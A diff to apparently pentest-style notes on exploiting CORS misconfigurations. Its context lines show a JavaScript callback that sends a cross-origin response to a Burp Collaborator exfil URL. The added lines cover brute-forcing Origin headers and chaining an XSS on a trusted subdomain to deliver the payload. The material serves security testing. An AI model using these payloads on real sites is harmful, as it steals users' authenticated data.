@@ -24,3 +24,10 @@ function reqListener() {
    location = '//BURP-COLLABORATOR/exfil?data=' + this.responseText;
 };
 ```
+
+In order to enumerate the domains in the CORS policy, a brute force of values in the Origin header of the request should be initiated - if a domain is trusted it should be reflected in the ```ACAO``` response header.
+
+subdomains or other trusted origins that are vulnerable to XSS could be exploited in the following manner:
+```javascript
+window.location = 'https://sub.vulnerable.com/?xss=<CORS EXFILTRATION PAYLOAD>'
+```
